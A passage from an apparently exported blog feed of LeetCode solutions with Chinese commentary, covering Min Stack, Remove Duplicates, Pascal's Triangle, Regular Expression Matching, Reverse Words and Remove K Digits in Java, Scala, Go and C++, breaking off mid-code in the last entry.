<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MinStack</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">int</span> min = Integer.MAX_VALUE;</span><br><span class="line"></span><br><span class="line">   Stack&lt;Integer&gt; stack;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** initialize your data structure here. */</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">MinStack</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    stack = <span class="keyword">new</span> Stack&lt;Integer&gt;();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">     <span class="comment">// only push the old minimum value when the current</span></span><br><span class="line">     <span class="comment">// minimum value changes after pushing the new value x</span></span><br><span class="line">     <span class="keyword">if</span>(x &lt;= min)&#123;</span><br><span class="line">       stack.push(min);</span><br><span class="line">       min=x;</span><br><span class="line">     &#125;</span><br><span class="line">     stack.push(x);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     <span class="comment">// if pop operation could result in the changing of the current minimum value,</span></span><br><span class="line">     <span class="comment">// pop twice and change the current minimum value to the last minimum value.</span></span><br><span class="line">     <span class="keyword">if</span>(stack.pop() == min) &#123;</span><br><span class="line">       min=stack.pop();</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> stack.peek();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getMin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> min;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://leetcode.com/problems/min-stack/" target="_blank" rel="noopener">min-stack</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>stack</tag>
      </tags>
  </entry>
  <entry>
    <title>26. Remove Duplicates from Sorted Array</title>
    <url>/2019/03/21/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Remove%20Duplicates%20from%20Sorted%20Array/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Given a sorted array nums, remove the duplicates in-place such that each element appear only once and return the new length.</span><br><span class="line"></span><br><span class="line">Do not allocate extra space for another array, you must do this by modifying the input array in-place with O(1) extra memory.</span><br><span class="line"></span><br><span class="line">Example 1:</span><br><span class="line"></span><br><span class="line">Given nums = [1,1,2],</span><br><span class="line"></span><br><span class="line">Your function should return length = 2, with the first two elements of nums being 1 and 2 respectively.</span><br><span class="line"></span><br><span class="line">It doesn&apos;t matter what you leave beyond the returned length.</span><br><span class="line">Example 2:</span><br><span class="line"></span><br><span class="line">Given nums = [0,0,1,1,1,2,2,3,3,4],</span><br><span class="line"></span><br><span class="line">Your function should return length = 5, with the first five elements of nums being modified to 0, 1, 2, 3, and 4 respectively.</span><br><span class="line"></span><br><span class="line">It doesn&apos;t matter what values are set beyond the returned length.</span><br><span class="line">Clarification:</span><br><span class="line"></span><br><span class="line">Confused why the returned value is an integer but your answer is an array?</span><br><span class="line"></span><br><span class="line">Note that the input array is passed in by reference, which means modification to the input array will be known to the caller as well.</span><br><span class="line"></span><br><span class="line">Internally you can think of this:</span><br><span class="line"></span><br><span class="line">// nums is passed in by reference. (i.e., without making a copy)</span><br><span class="line">int len = removeDuplicates(nums);</span><br><span class="line"></span><br><span class="line">// any modification to nums in your function would be known by the caller.</span><br><span class="line">// using the length returned by your function, it prints the first len elements.</span><br><span class="line">for (int i = 0; i &lt; len; i++) &#123;</span><br><span class="line">    print(nums[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="题目解读"><a href="#题目解读" class="headerlink" title="题目解读"></a>题目解读</h1><p>在不占用额外内存的情况下完成数组的去重。这里用两个变量 i,j 来指向原始数组和去重后数组的元素位置。当 i 和 j 指向的元素不等的时候即查找到非重复元素,然后 j+1,依次遍历到结束。</p>
<h1 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h1><blockquote>
<ul>
<li>scala</li>
</ul>
</blockquote>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * @author xwolf</span></span><br><span class="line"><span class="comment">  * @result accept</span></span><br><span class="line"><span class="comment">  * @tags Array</span></span><br><span class="line"><span class="comment">  * @date 2019-03-21 14:20</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">RemoveDuplicatesFromSortedArray</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">removeDuplicates</span></span>(nums: <span class="type">Array</span>[<span class="type">Int</span>]): <span class="type">Int</span> = &#123;</span><br><span class="line">    <span class="keyword">if</span> (nums == <span class="literal">null</span> || nums.length==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">var</span> j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> (i &lt;- <span class="number">0</span> until nums.length)&#123;</span><br><span class="line">      <span class="keyword">if</span> (nums(i) != nums(j))&#123;</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">        nums(j) = nums(i)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    j + <span class="number">1</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接看个图比较容易理解</p>
<p><img src="/2019/03/21/数据结构和算法/leetcode/Remove Duplicates from Sorted Array/26. Remove Duplicates from Sorted Array.png" alt></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><p><a href="https://leetcode.com/problems/remove-duplicates-from-sorted-array/" target="_blank" rel="noopener">Remove Duplicates from Sorted Array</a></p>
</li>
<li><p><a href="https://en.wikipedia.org/wiki/In-place_algorithm" target="_blank" rel="noopener">In-place_algorithm</a></p>
</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>118. Pascal&#39;s Triangle</title>
    <url>/2019/07/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Pascal&#39;s%20Triangle/</url>
    <content><![CDATA[<p>Given a non-negative integer numRows, generate the first numRows of Pascal’s triangle.</p>
<p>In Pascal’s triangle, each number is the sum of the two numbers directly above it.</p>
<blockquote>
<ul>
<li>Example:</li>
</ul>
</blockquote>
<p>Input: 5</p>
<p>Output:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">     [1],</span><br><span class="line">    [1,1],</span><br><span class="line">   [1,2,1],</span><br><span class="line">  [1,3,3,1],</span><br><span class="line"> [1,4,6,4,1]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>实现帕斯卡三角.</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<p>递归实现。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; generate(<span class="keyword">int</span> numRows) &#123;</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numRows; i++) &#123;</span><br><span class="line">      result = result(result);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; result(List&lt;List&lt;Integer&gt;&gt; result) &#123;</span><br><span class="line">    <span class="keyword">int</span> size = result.size();</span><br><span class="line">    <span class="keyword">if</span>(size == <span class="number">0</span>) &#123;</span><br><span class="line">      List&lt;Integer&gt; ele = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">      ele.add(<span class="number">1</span>);</span><br><span class="line">      result.add(ele);</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    List&lt;Integer&gt; lastEle = result.get(size - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> lastSize = lastEle.size();</span><br><span class="line">    List&lt;Integer&gt; e = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    e.add(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; lastSize - <span class="number">1</span>; i++) &#123;</span><br><span class="line">      e.add(lastEle.get(i) + lastEle.get(i + <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    e.add(<span class="number">1</span>);</span><br><span class="line">    result.add(e);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote>
<ul>
<li><a href="https://leetcode.com/problems/pascals-triangle/solution/" target="_blank" rel="noopener">118. Pascal’s Triangle
</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>DP</tag>
        <tag>leetcode</tag>
        <tag>递归</tag>
      </tags>
  </entry>
  <entry>
    <title>10. Regular Expression Matching</title>
    <url>/2019/05/16/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Regular%20Expression%20Matching/</url>
    <content><![CDATA[<p>Given an input string (s) and a pattern (p), implement regular expression matching with support for ‘.’ and ‘*‘.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos;.&apos; Matches any single character.</span><br><span class="line">&apos;\*&apos; Matches zero or more of the preceding element.</span><br><span class="line">The matching should cover the entire input string (not partial).</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<blockquote>
<ul>
<li>s could be empty and contains only lowercase letters a-z.</li>
<li><p>p could be empty and contains only lowercase letters a-z, and characters like . or *.</p>
</li>
<li><p>Example 1:</p>
</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input:</span><br><span class="line">s = &quot;aa&quot;</span><br><span class="line">p = &quot;a&quot;</span><br><span class="line">Output: false</span><br><span class="line">Explanation: &quot;a&quot; does not match the entire string &quot;aa&quot;.</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>Example 2:</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input:</span><br><span class="line">s = &quot;aa&quot;</span><br><span class="line">p = &quot;a*&quot;</span><br><span class="line">Output: true</span><br><span class="line">Explanation: &apos;*&apos; means zero or more of the precedeng element, &apos;a&apos;. Therefore, by repeating &apos;a&apos; once, it becomes &quot;aa&quot;.</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>Example 3:</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input:</span><br><span class="line">s = &quot;ab&quot;</span><br><span class="line">p = &quot;.*&quot;</span><br><span class="line">Output: true</span><br><span class="line">Explanation: &quot;.*&quot; means &quot;zero or more (*) of any character (.)&quot;.</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>Example 4:</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input:</span><br><span class="line">s = &quot;aab&quot;</span><br><span class="line">p = &quot;c*a*b&quot;</span><br><span class="line">Output: true</span><br><span class="line">Explanation: c can be repeated 0 times, a can be repeated 1 time. Therefore it matches &quot;aab&quot;.</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>Example 5:</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input:</span><br><span class="line">s = &quot;mississippi&quot;</span><br><span class="line">p = &quot;mis*is*p*.&quot;</span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>正则匹配</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<p>动态规划</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 动态规划</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> s</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> p</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isMatch</span><span class="params">(String s, String p)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (s == <span class="keyword">null</span> || p == <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">boolean</span>[][] dp = <span class="keyword">new</span> <span class="keyword">boolean</span>[s.length()+<span class="number">1</span>][p.length()+<span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; p.length(); i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (p.charAt(i) == <span class="string">'*'</span> &amp;&amp; dp[<span class="number">0</span>][i-<span class="number">1</span>]) &#123;</span><br><span class="line">        dp[<span class="number">0</span>][i+<span class="number">1</span>] = <span class="keyword">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; s.length(); i++) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; p.length(); j++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (p.charAt(j) == <span class="string">'.'</span>) &#123;</span><br><span class="line">          dp[i+<span class="number">1</span>][j+<span class="number">1</span>] = dp[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (p.charAt(j) == s.charAt(i)) &#123;</span><br><span class="line">          dp[i+<span class="number">1</span>][j+<span class="number">1</span>] = dp[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (p.charAt(j) == <span class="string">'*'</span>) &#123;</span><br><span class="line">          <span class="keyword">if</span> (p.charAt(j-<span class="number">1</span>) != s.charAt(i) &amp;&amp; p.charAt(j-<span class="number">1</span>) != <span class="string">'.'</span>) &#123;</span><br><span class="line">            dp[i+<span class="number">1</span>][j+<span class="number">1</span>] = dp[i+<span class="number">1</span>][j-<span class="number">1</span>];</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            dp[i+<span class="number">1</span>][j+<span class="number">1</span>] = (dp[i+<span class="number">1</span>][j] || dp[i][j+<span class="number">1</span>] || dp[i+<span class="number">1</span>][j-<span class="number">1</span>]);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[s.length()][p.length()];</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://leetcode.com/problems/regular-expression-matching/discuss/?currentPage=1&amp;orderBy=most_votes&amp;query=" target="_blank" rel="noopener">regular-expression-matching</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>DP</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>151. Reverse Words in a String</title>
    <url>/2018/06/07/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Reverse%20Words%20in%20a%20String/</url>
    <content><![CDATA[<p>Given an input string, reverse the string word by word.<br>Example:<br>Input: “the sky is blue”,<br>Output: “blue is sky the”.<br>Note:<br>A word is defined as a sequence of non-space characters.<br>Input string may contain leading or trailing spaces. However, your reversed string should not contain leading or trailing spaces.<br>You need to reduce multiple spaces between two words to a single space in the reversed string.<br>Follow up: For C programmers, try to solve it in-place in O(1) space.</p>
<blockquote>
<h1 id="题目解读"><a href="#题目解读" class="headerlink" title="题目解读"></a>题目解读</h1><p>给的字符串,根据单词来翻转.其中不能有连续的空格,如果有保留一个,前后空格不能存在.</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><ul>
<li>java</li>
</ul>
</blockquote>
<p>利用正则表达式将前后空格删除,根据正则两多个空格删除,保留一个空格.<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">reverseWords</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">      StringBuilder builder = <span class="keyword">new</span> StringBuilder(s.trim().replaceAll(<span class="string">"\r|\n|\\s+"</span>,<span class="string">" "</span>));</span><br><span class="line">      String[] arys = builder.toString().split(<span class="string">" "</span>);</span><br><span class="line">      StringBuilder b = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">      <span class="keyword">int</span> length = arys.length;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i=length-<span class="number">1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">          b.append(arys[i]).append(<span class="string">" "</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> b.toString().trim();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<ul>
<li>go</li>
</ul>
</blockquote>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> leetcode</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"strings"</span></span><br><span class="line">	<span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Reverse</span><span class="params">(s <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">   str := strings.TrimSpace(s)</span><br><span class="line">   strAry := strings.Split(str,<span class="string">" "</span>)</span><br><span class="line">   fmt.Println(strAry)</span><br><span class="line">   size := <span class="built_in">len</span>(strAry) - <span class="number">1</span></span><br><span class="line">   res := <span class="string">""</span></span><br><span class="line">   <span class="keyword">for</span> i:=size ;i &gt;= <span class="number">0</span> ; i-- &#123;</span><br><span class="line">   	<span class="keyword">if</span> <span class="built_in">len</span>(strAry[i])&gt; <span class="number">0</span>&#123;</span><br><span class="line">		res += strAry[i]</span><br><span class="line">		<span class="keyword">if</span> i!=<span class="number">0</span> &#123;</span><br><span class="line">			res += <span class="string">" "</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>讨论区其他答案</p>
<blockquote>
<ul>
<li>go</li>
</ul>
</blockquote>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">reverseWords</span><span class="params">(s <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">	fields := strings.Fields(s)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> reverses []<span class="keyword">string</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="built_in">len</span>(fields)<span class="number">-1</span>; i &gt;= <span class="number">0</span>; i-- &#123;</span><br><span class="line">		reverses = <span class="built_in">append</span>(reverses, fields[i])</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> strings.Join(reverses, <span class="string">" "</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<p>java两个指针来解决问题</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">reverseWords</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (s == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span>[] a = s.toCharArray();</span><br><span class="line">    <span class="keyword">int</span> n = a.length;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// step 1. reverse the whole string</span></span><br><span class="line">    reverse(a, <span class="number">0</span>, n - <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// step 2. reverse each word</span></span><br><span class="line">    reverseWords(a, n);</span><br><span class="line">    <span class="comment">// step 3. clean up spaces</span></span><br><span class="line">    <span class="keyword">return</span> cleanSpaces(a, n);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">reverseWords</span><span class="params">(<span class="keyword">char</span>[] a, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">while</span> (i &lt; n) &#123;</span><br><span class="line">      <span class="keyword">while</span> (i &lt; j || i &lt; n &amp;&amp; a[i] == <span class="string">' '</span>) i++; <span class="comment">// skip spaces</span></span><br><span class="line">      <span class="keyword">while</span> (j &lt; i || j &lt; n &amp;&amp; a[j] != <span class="string">' '</span>) j++; <span class="comment">// skip non spaces</span></span><br><span class="line">      reverse(a, i, j - <span class="number">1</span>);                      <span class="comment">// reverse the word</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// trim leading, trailing and multiple spaces</span></span><br><span class="line">  <span class="function">String <span class="title">cleanSpaces</span><span class="params">(<span class="keyword">char</span>[] a, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">while</span> (j &lt; n) &#123;</span><br><span class="line">      <span class="keyword">while</span> (j &lt; n &amp;&amp; a[j] == <span class="string">' '</span>) j++;             <span class="comment">// skip spaces</span></span><br><span class="line">      <span class="keyword">while</span> (j &lt; n &amp;&amp; a[j] != <span class="string">' '</span>) a[i++] = a[j++]; <span class="comment">// keep non spaces</span></span><br><span class="line">      <span class="keyword">while</span> (j &lt; n &amp;&amp; a[j] == <span class="string">' '</span>) j++;             <span class="comment">// skip spaces</span></span><br><span class="line">      <span class="keyword">if</span> (j &lt; n) a[i++] = <span class="string">' '</span>;                      <span class="comment">// keep only one space</span></span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> String(a).substring(<span class="number">0</span>, i);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// reverse a[] from a[i] to a[j]</span></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">reverse</span><span class="params">(<span class="keyword">char</span>[] a, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">      <span class="keyword">char</span> t = a[i];</span><br><span class="line">      a[i++] = a[j];</span><br><span class="line">      a[j--] = t;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>CPP</li>
</ul>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverseWords</span><span class="params">(<span class="built_in">string</span> &amp;s)</span> </span>&#123;</span><br><span class="line">    reverse(s.begin(), s.end());</span><br><span class="line">    <span class="keyword">int</span> storeIndex = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.size(); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (s[i] != <span class="string">' '</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (storeIndex != <span class="number">0</span>) s[storeIndex++] = <span class="string">' '</span>;</span><br><span class="line">            <span class="keyword">int</span> j = i;</span><br><span class="line">            <span class="keyword">while</span> (j &lt; s.size() &amp;&amp; s[j] != <span class="string">' '</span>) &#123; s[storeIndex++] = s[j++]; &#125;</span><br><span class="line">            reverse(s.begin() + storeIndex - (j - i), s.begin() + storeIndex);</span><br><span class="line">            i = j;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    s.erase(s.begin() + storeIndex, s.end());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://leetcode.com/problems/reverse-words-in-a-string/description/" target="_blank" rel="noopener">Reverse Words in a String</a></li>
</ul>
</blockquote>
<h4 id="如有错误-欢迎批评指正-望不吝赐教"><a href="#如有错误-欢迎批评指正-望不吝赐教" class="headerlink" title="如有错误,欢迎批评指正,望不吝赐教!!!"></a>如有错误,欢迎批评指正,望不吝赐教!!!</h4>]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>402. Remove K Digits</title>
    <url>/2019/06/11/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/leetcode/Remove%20K%20Digits/</url>
    <content><![CDATA[<p>Given a non-negative integer num represented as a string, remove k digits from the number so that the new number is the smallest possible.</p>
<blockquote>
<p>Note:</p>
<ul>
<li>The length of num is less than 10002 and will be ≥ k.</li>
<li>The given num does not contain any leading zero.</li>
</ul>
<p>Example 1:</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: num = &quot;1432219&quot;, k = 3</span><br><span class="line">Output: &quot;1219&quot;</span><br><span class="line">Explanation: Remove the three digits 4, 3, and 2 to form the new number 1219 which is the smallest.</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Example 2:</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: num = &quot;10200&quot;, k = 1</span><br><span class="line">Output: &quot;200&quot;</span><br><span class="line">Explanation: Remove the leading 1 and the number is 200. Note that the output must not contain leading zeroes.</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Example 3:</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: num = &quot;10&quot;, k = 2</span><br><span class="line">Output: &quot;0&quot;</span><br><span class="line">Explanation: Remove all the digits from the number and it is left with nothing which is 0.</span><br></pre></td></tr></table></figure>
<h1 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h1><p>删除字符串数字中指定的 k 个数字,使得剩下的数字尽可能小.</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><blockquote>
<ul>
<li>java</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">removeKdigits</span><span class="params">(String num, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> digits = num.length() - k;</span><br><span class="line">    <span class="keyword">char</span>[] stk = <span class="keyword">new</span> <span class="keyword">char</span>[num.length()];</span><br><span class="line">    <span class="keyword">int</span> top = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// k keeps track of how many characters we can remove</span></span><br><span class="line">    <span class="comment">// if the previous character in stk is larger than the current one</span></span><br><span class="line">    <span class="comment">// then removing it will get a smaller number</span></span><br><span class="line">    <span class="comment">// but we can only do so when k is larger than 0</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; num.length(); ++i) &#123;</span><br><span class="line">      <span class="keyword">char</span> c = num.charAt(i);</span><br><span class="line">      <span class="keyword">while</span> (top &gt; <span class="number">0</span> &amp;&amp; stk[top - <span class="number">1</span>] 